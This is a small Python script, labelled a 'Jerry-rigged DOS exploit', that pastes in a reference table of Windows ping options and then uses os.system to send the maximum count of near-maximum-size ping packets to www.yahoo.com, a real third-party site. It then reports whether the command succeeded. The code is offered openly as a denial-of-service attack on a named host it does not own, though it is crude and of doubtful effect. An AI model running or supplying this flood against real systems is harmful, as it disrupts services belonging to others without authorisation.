#Jerry-rigged DOS exploit
'''
Ping Command Syntax
ping [-t] [-a] [-n count] [-l size] [-f] [-i TTL] [-v TOS] [-r count] [-s count] [-w timeout] [-R] [-S srcaddr] [-p] [-4] [-6] target [/?]

Tip: See How to Read Command Syntax if you're not sure how to interpret the ping command syntax above or described in the table below.

-t	Using this option will ping the target until you force it to stop using Ctrl-C.
-a	This ping command option will resolve, if possible, the hostname of an IP address target.
-n count	This option sets the number of ICMP Echo Requests to send, from 1 to 4294967295. The ping command will send 4 by default if -n isn't used.
-l size	Use this option to set the size, in bytes, of the echo request packet from 32 to 65,527. The ping command will send a 32-byte echo request if you don't use the -l option.
-f	Use this ping command option to prevent ICMP Echo Requests from being fragmented by routers between you and the target. The -f option is most often used to troubleshoot Path Maximum Transmission Unit (PMTU) issues.
-i TTL	This option sets the Time to Live (TTL) value, the maximum of which is 255.
-v TOS	This option allows you to set a Type of Service (TOS) value. Beginning in Windows 7, this option no longer functions but still exists for compatibility reasons.
-r count	Use this ping command option to specify the number of hops between your computer and the target computer or device that you'd like to be recorded and displayed. The maximum value for count is 9, so use the tracert command instead if you're interested in viewing all the hops between two devices.
-s count	Use this option to report the time, in Internet Timestamp format, that each echo request is received and echo reply is sent. The maximum value for count is 4, meaning that only the first four hops can be time stamped.
-w timeout	Specifying a timeout value when executing the ping command adjusts the amount of time, in milliseconds, that ping waits for each reply. If you don't use the -w option, the default timeout value of 4000 is used, which is 4 seconds.
-R	This option tells the ping command to trace the round trip path.
-S srcaddr	Use this option to specify the source address.
-p	Use this switch to ping a Hyper-V Network Virtualization provider address.
-4	This forces the ping command to use IPv4 only but is only necessary if target is a hostname and not an IP address.
-6	This forces the ping command to use IPv6 only but as with the -4 option, is only necessary when pinging a hostname.
target	This is the destination you wish to ping, either an IP address or a hostname.
'''
import os
#drop the hammer...>ping -n 4294967295 -l 65500
#OG...>ping -c 1  	
fish = "www.yahoo.com"
catch = os.system("ping -n 4294967295 -l 65500 " + fish)

#check our catch...
if catch == 0:
	print(fish, '...got a bite!')
else:
	#error code type >= 1
	print(fish, 'nothin...!')